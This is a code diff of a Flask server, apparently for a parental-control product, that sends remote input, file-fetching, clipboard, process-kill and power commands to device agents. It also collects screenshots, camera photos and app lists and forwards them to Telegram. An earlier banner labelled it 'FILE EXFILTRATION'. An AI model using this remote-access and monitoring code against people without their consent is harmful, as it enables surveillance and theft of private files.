     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
+
 @app.route('/api/monitor/apps', methods=['POST'])
 @require_agent_auth
 def monitor_apps():
     try:
-        data = request.json or {}
+        data        = request.json or {}
         incoming_id = data.get('deviceId', 'unknown')
         hostname    = data.get('deviceModel', '')
         public_ip   = _get_public_ip_from_request()
-        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+        device_id   = _resolve_canonical_id(incoming_id, hostname, public_ip)
 
         apps = data.get('apps', [])
         if device_id in devices:
@@ -1734,15 +1858,16 @@ def monitor_apps():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
+
 @app.route('/api/monitor/running-apps', methods=['POST'])
 @require_agent_auth
 def monitor_running_apps():
     try:
-        data = request.json or {}
+        data        = request.json or {}
         incoming_id = data.get('deviceId', 'unknown')
         hostname    = data.get('deviceModel', '')
         public_ip   = _get_public_ip_from_request()
-        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+        device_id   = _resolve_canonical_id(incoming_id, hostname, public_ip)
 
         apps = data.get('apps', [])
         if device_id in devices:
@@ -1759,21 +1884,32 @@ def monitor_running_apps():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
+
 @app.route('/api/monitor/screen-info', methods=['POST'])
 @require_agent_auth
 def monitor_screen_info():
     try:
-        data = request.json or {}
+        data        = request.json or {}
         incoming_id = data.get('deviceId', 'unknown')
         hostname    = data.get('deviceModel', '')
         public_ip   = _get_public_ip_from_request()
-        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+        device_id   = _resolve_canonical_id(incoming_id, hostname, public_ip)
 
         device_screens[device_id] = {
-            'width':   data.get('width', 1080),
-            'height':  data.get('height', 2400),
-            'density': data.get('density', 0),
+            'width':         int(data.get('width', 0)) or 0,
+            'height':        int(data.get('height', 0)) or 0,
+            'origin_x':      int(data.get('origin_x', 0)) or 0,
+            'origin_y':      int(data.get('origin_y', 0)) or 0,
+            'monitors':      data.get('monitors', []),
+            'density':       int(data.get('density', 96)) or 96,
+            'dpi_mode':      data.get('dpi_mode', 'unknown'),
+            'agent_version': data.get('agent_version', 'unknown'),
+            'updated_at':    datetime.now().isoformat(),
         }
+        logger.info(f"📐 screen-info {device_id[:8]}: "
+                    f"{device_screens[device_id]['width']}x"
+                    f"{device_screens[device_id]['height']} "
+                    f"(dpi={device_screens[device_id]['dpi_mode']})")
         return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
@@ -1783,6 +1919,7 @@ def monitor_screen_info():
 # ============================================================
 class DeviceOfflineError(Exception):
     pass
+
 
 def _enqueue(device_id: str, action: str,
              params: dict = None, ttl: float = 12.0) -> str:
@@ -1817,6 +1954,7 @@ def _enqueue(device_id: str, action: str,
     logger.info(f"🎮 Queued '{action}' for {device_id[:8]} (id={cmd_id[:8]})")
     return cmd_id
 
+
 def _enqueue_response(device_id, action, params=None, ttl=12.0):
     try:
         cid = _enqueue(device_id, action, params, ttl)
@@ -1824,6 +1962,7 @@ def _enqueue_response(device_id, action, params=None, ttl=12.0):
     except DeviceOfflineError as e:
         logger.warning(f"❌ Refused command '{action}': {e}")
         return {'success': False, 'error': str(e), 'offline': True}, 503
+
 
 @app.route('/api/control/poll', methods=['GET', 'OPTIONS'])
 @require_agent_auth
@@ -1835,9 +1974,10 @@ def control_poll():
 
     if _is_placeholder_id(incoming_id):
         logger.warning(f"🚫 Refused poll from placeholder ID: {incoming_id}")
-        return jsonify({"success": False, "error": "placeholder id not allowed"}), 400
+        return jsonify({"success": False,
+                        "error": "placeholder id not allowed"}), 400
 
-    public_ip   = _get_public_ip_from_request()
+    public_ip = _get_public_ip_from_request()
     device_id = _resolve_canonical_id(incoming_id, "", public_ip)
 
     control_devices[device_id] = time.time()
@@ -1876,6 +2016,7 @@ def control_poll():
     command_queues[device_id] = fresh
     return jsonify(list(fresh))
 
+
 @app.route('/api/control/result', methods=['POST', 'OPTIONS'])
 @require_agent_auth
 def control_result():
@@ -1895,9 +2036,10 @@ def control_result():
         }
         status = "✅" if ok else f"❌ {data.get('error', '')[:80]}"
         add_activity('control',
-                     f'Action {cid[:8]} ({data.get("action","?")}) → {status}',
+                     f'Action {cid[:8]} ({data.get("action", "?")}) → {status}',
                      data.get('deviceId', 'unknown'))
     return jsonify({'success': True})
+
 
 # ---- Input commands ----
 @app.route('/api/control/tap', methods=['POST'])
@@ -1910,6 +2052,7 @@ def control_tap():
         {'x': d.get('x', 0), 'y': d.get('y', 0)})
     return jsonify(payload), code
 
+
 @app.route('/api/control/longpress', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -1919,6 +2062,7 @@ def control_longpress():
         d.get('deviceId', 'unknown'), 'longpress',
         {'x': d.get('x', 0), 'y': d.get('y', 0)})
     return jsonify(payload), code
+
 
 @app.route('/api/control/swipe', methods=['POST'])
 @require_parent_auth
@@ -1933,6 +2077,7 @@ def control_swipe():
         })
     return jsonify(payload), code
 
+
 @app.route('/api/control/text', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -1942,6 +2087,7 @@ def control_text():
         d.get('deviceId', 'unknown'), 'text', {'text': d.get('text', '')})
     return jsonify(payload), code
 
+
 @app.route('/api/control/backspace', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -1950,6 +2096,7 @@ def control_backspace():
     payload, code = _enqueue_response(
         d.get('deviceId', 'unknown'), 'backspace', {})
     return jsonify(payload), code
+
 
 @app.route('/api/control/key', methods=['POST'])
 @require_parent_auth
@@ -1964,6 +2111,7 @@ def control_key():
     payload, code = _enqueue_response(d.get('deviceId', 'unknown'), key, {})
     return jsonify(payload), code
 
+
 @app.route('/api/control/rightclick', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -1974,6 +2122,7 @@ def control_rightclick():
         {'x': d.get('x', 0), 'y': d.get('y', 0)})
     return jsonify(payload), code
 
+
 @app.route('/api/control/doubleclick', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -1983,6 +2132,34 @@ def control_doubleclick():
         d.get('deviceId', 'unknown'), 'doubleclick',
         {'x': d.get('x', 0), 'y': d.get('y', 0)})
     return jsonify(payload), code
+
+
+@app.route('/api/control/click-normalized', methods=['POST'])
+@require_parent_auth
+@rate_limit('control')
+def control_click_normalized():
+    """
+    v1.2.9: nx, ny in [0.0, 1.0] as fractions of the screenshot.
+    The agent scales by its real screen bounds — DPI/scale-proof.
+    """
+    d = request.json or {}
+    try:
+        nx = float(d.get('nx'))
+        ny = float(d.get('ny'))
+    except (TypeError, ValueError):
+        return jsonify({'success': False,
+                        'error': 'nx, ny required (0..1)'}), 400
+    if not (0.0 <= nx <= 1.0 and 0.0 <= ny <= 1.0):
+        return jsonify({'success': False,
+                        'error': 'nx, ny must be in [0,1]'}), 400
+    kind = str(d.get('kind', 'tap')).lower()
+    if kind not in ('tap', 'doubleclick', 'rightclick', 'longpress'):
+        return jsonify({'success': False, 'error': 'bad kind'}), 400
+    payload, code = _enqueue_response(
+        d.get('deviceId', 'unknown'), 'click_normalized',
+        {'nx': nx, 'ny': ny, 'kind': kind})
+    return jsonify(payload), code
+
 
 @app.route('/api/control/scroll', methods=['POST'])
 @require_parent_auth
@@ -1996,6 +2173,7 @@ def control_scroll():
         })
     return jsonify(payload), code
 
+
 @app.route('/api/control/hotkey', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -2007,6 +2185,7 @@ def control_hotkey():
     payload, code = _enqueue_response(
         d.get('deviceId', 'unknown'), 'hotkey', {'keys': keys})
     return jsonify(payload), code
+
 
 @app.route('/api/control/launch', methods=['POST'])
 @require_parent_auth
@@ -2022,6 +2201,7 @@ def control_launch():
         add_activity('launch', f'Launch: {package[:60]}', device_id)
     return jsonify(payload), code
 
+
 @app.route('/api/control/launch-history', methods=['GET'])
 @require_parent_auth
 def control_launch_history():
@@ -2030,19 +2210,35 @@ def control_launch_history():
     launches  = [
         a for a in activities[-200:]
         if a.get('action') == 'launch'
-        or (a.get('action') == 'control' and 'launch' in a.get('details', '').lower())
+        or (a.get('action') == 'control'
+            and 'launch' in a.get('details', '').lower())
     ]
     if device_id:
         launches = [a for a in launches if a.get('device_id') == device_id]
     return jsonify({'success': True, 'launches': launches[-limit:]})
 
+
 @app.route('/api/control/screen-info/<device_id>', methods=['GET'])
 @require_parent_auth
 def control_screen_info(device_id):
-    info = device_screens.get(device_id)
-    if not info:
-        return jsonify({'width': 1080, 'height': 2400, 'density': 0, 'known': False})
+    """
+    v1.2.9: returns the real screen size for the device, plus the
+    most recent width/height observed from a screenshot (whichever
+    is fresher). known=False means the dashboard must NOT compute
+    pixel clicks yet.
+    """
+    info = dict(device_screens.get(device_id, {}))
+    if not info or not info.get('width'):
+        for s in reversed(screenshots):
+            if s.get('device_id') == device_id and s.get('width', 0) > 0:
+                info = {'width': s['width'],
+                        'height': s['height'],
+                        'density': 96}
+                break
+    if not info or not info.get('width') or not info.get('height'):
+        return jsonify({'width': 0, 'height': 0, 'density': 0, 'known': False})
     return jsonify({**info, 'known': True})
+
 
 @app.route('/api/control/status/<cmd_id>', methods=['GET'])
 @require_parent_auth
@@ -2051,6 +2247,7 @@ def control_status(cmd_id):
     if not r:
         return jsonify({'success': True, 'pending': True})
     return jsonify({'success': True, 'pending': False, **r})
+
 
 @app.route('/api/control/status-batch', methods=['POST'])
 @require_parent_auth
@@ -2062,6 +2259,7 @@ def control_status_batch():
         if r:
             out[cid] = r
     return jsonify({'success': True, 'results': out})
+
 
 @app.route('/api/control/devices', methods=['GET'])
 @require_parent_auth
@@ -2090,15 +2288,16 @@ def control_fetch_file():
                      d.get('deviceId', 'unknown'))
     return jsonify(payload), code
 
+
 @app.route('/api/control/fetch-folder', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
 def control_fetch_folder():
     d = request.json or {}
-    path   = (d.get('path') or '').strip()
-    glob   = (d.get('glob') or '*').strip() or '*'
-    max_n  = int(d.get('max', 20))
-    max_n  = max(1, min(max_n, 50))
+    path  = (d.get('path') or '').strip()
+    glob  = (d.get('glob') or '*').strip() or '*'
+    max_n = int(d.get('max', 20))
+    max_n = max(1, min(max_n, 50))
     if not path:
         return jsonify({'success': False, 'error': 'path required'}), 400
     payload, code = _enqueue_response(
@@ -2122,6 +2321,7 @@ def control_clipboard_get():
         d.get('deviceId', 'unknown'), 'clipboard_get', {}, ttl=20.0)
     return jsonify(payload), code
 
+
 @app.route('/api/control/clipboard-set', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -2131,6 +2331,7 @@ def control_clipboard_set():
         d.get('deviceId', 'unknown'), 'clipboard_set',
         {'text': d.get('text', '')}, ttl=20.0)
     return jsonify(payload), code
+
 
 @app.route('/api/control/power', methods=['POST'])
 @require_parent_auth
@@ -2142,6 +2343,7 @@ def control_power():
         {'action': d.get('action', '')}, ttl=15.0)
     return jsonify(payload), code
 
+
 @app.route('/api/control/list-dir', methods=['POST'])
 @require_parent_auth
 @rate_limit('control')
@@ -2151,6 +2353,7 @@ def control_list_dir():
         d.get('deviceId', 'unknown'), 'list_dir',
         {'path': d.get('path', '')}, ttl=20.0)
     return jsonify(payload), code
+
 
 @app.route('/api/control/kill', methods=['POST'])
 @require_parent_auth
@@ -2171,10 +2374,12 @@ def telegram_status():
     return jsonify({
         "success":        True,
         "enabled":        telegram_config.get("enabled", False),
-        "configured":     bool(telegram_config.get("bot_token") and telegram_config.get("chat_id")),
+        "configured":     bool(telegram_config.get("bot_token")
+                               and telegram_config.get("chat_id")),
         "notify_online":  telegram_config.get("notify_online", True),
         "notify_offline": telegram_config.get("notify_offline", True),
     })
+
 
 @app.route('/api/telegram/config', methods=['GET', 'POST'])
 @require_parent_auth
@@ -2192,14 +2397,20 @@ def telegram_config_endpoint():
             }
         })
     data = request.json or {}
-    if 'bot_token'      in data: telegram_config['bot_token']      = str(data['bot_token']).strip()
-    if 'chat_id'        in data: telegram_config['chat_id']        = str(data['chat_id']).strip()
-    if 'enabled'        in data: telegram_config['enabled']        = bool(data['enabled'])
-    if 'notify_online'  in data: telegram_config['notify_online']  = bool(data['notify_online'])
-    if 'notify_offline' in data: telegram_config['notify_offline'] = bool(data['notify_offline'])
+    if 'bot_token'      in data:
+        telegram_config['bot_token'] = str(data['bot_token']).strip()
+    if 'chat_id'        in data:
+        telegram_config['chat_id']   = str(data['chat_id']).strip()
+    if 'enabled'        in data:
+        telegram_config['enabled']        = bool(data['enabled'])
+    if 'notify_online'  in data:
+        telegram_config['notify_online']  = bool(data['notify_online'])
+    if 'notify_offline' in data:
+        telegram_config['notify_offline'] = bool(data['notify_offline'])
     _save_telegram_config()
     logger.info(f"📲 Telegram config updated (enabled={telegram_config['enabled']})")
     return jsonify({'success': True})
+
 
 @app.route('/api/telegram/test', methods=['POST'])
 @require_parent_auth
@@ -2210,6 +2421,7 @@ def telegram_test():
         f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
     )
     return jsonify(r)
+
 
 @app.route('/api/telegram/send-screenshot/<filename>', methods=['POST'])
 @require_parent_auth
@@ -2229,6 +2441,7 @@ def telegram_send_screenshot(filename):
             return jsonify(r)
     return jsonify({'success': False, 'error': f'File not found: {filename}'}), 404
 
+
 @app.route('/api/telegram/send-camera/<filename>', methods=['POST'])
 @require_parent_auth
 @rate_limit('telegram')
@@ -2237,18 +2450,20 @@ def telegram_send_camera(filename):
     for directory in [UPLOAD_DIR, CAMERA_DIR]:
         filepath = directory / filename
         if filepath.exists():
-            caption = f"📷 <b>Camera Photo</b>\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            caption = (f"📷 <b>Camera Photo</b>\n"
+                       f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
             r = _telegram_send_photo(filepath, caption)
             add_activity('telegram', f'Sent camera photo {filename}')
             return jsonify(r)
     return jsonify({'success': False, 'error': f'File not found: {filename}'}), 404
+
 
 @app.route('/api/telegram/send-file/<filename>', methods=['POST'])
 @require_parent_auth
 @rate_limit('telegram')
 def telegram_send_file(filename):
     """
-    v1.2.7: source=received | uploads | files (default)
+    source=received | uploads | files (default)
     """
     filename = safe_filename(filename)
     source   = (request.args.get('source') or 'files').lower()
@@ -2277,6 +2492,7 @@ def telegram_send_file(filename):
             return jsonify(r)
     return jsonify({'success': False, 'error': f'File not found: {filename}'}), 404
 
+
 @app.route('/api/telegram/send-apps', methods=['POST'])
 @require_parent_auth
 @rate_limit('telegram')
@@ -2303,6 +2519,7 @@ def telegram_send_apps():
     add_activity('telegram', f'Sent apps list ({len(apps)})', device_id)
     return jsonify(r)
 
+
 @app.route('/api/telegram/send-text', methods=['POST'])
 @require_parent_auth
 @rate_limit('telegram')
@@ -2322,9 +2539,12 @@ def telegram_send_text():
 def not_found(e):
     return jsonify({"success": False, "error": "Endpoint not found"}), 404
 
+
 @app.errorhandler(413)
 def request_too_large(e):
-    return jsonify({"success": False, "error": "File too large for upload (max 64MB)"}), 413
+    return jsonify({"success": False,
+                    "error": "File too large for upload (max 64MB)"}), 413
+
 
 @app.errorhandler(Exception)
 def handle_exception(e):
@@ -2338,6 +2558,7 @@ def _on_signal(signum, frame):
     logger.info(f"🛑 Received signal {signum}; shutting down")
     _stop_event.set()
 
+
 try:
     signal.signal(signal.SIGINT,  _on_signal)
     signal.signal(signal.SIGTERM, _on_signal)
@@ -2349,7 +2570,7 @@ except Exception:
 # ============================================================
 def main():
     print("=" * 70)
-    print("  PACON SERVICE v1.2.8 — ATOMIC CLICK + FILE EXFILTRATION")
+    print("  PACON SERVICE v1.2.9 — TRUE-RESOLUTION REMOTE CONTROL")
     print("=" * 70)
     print(f"  Web dir:          {WEB_DIR}")
     print(f"  Received dir:     {RECEIVED_DIR}")
@@ -2377,6 +2598,7 @@ def main():
         logger.info("🛑 Interrupted by user")
     finally:
         _stop_event.set()
+
 
 if __name__ == '__main__':
     main()
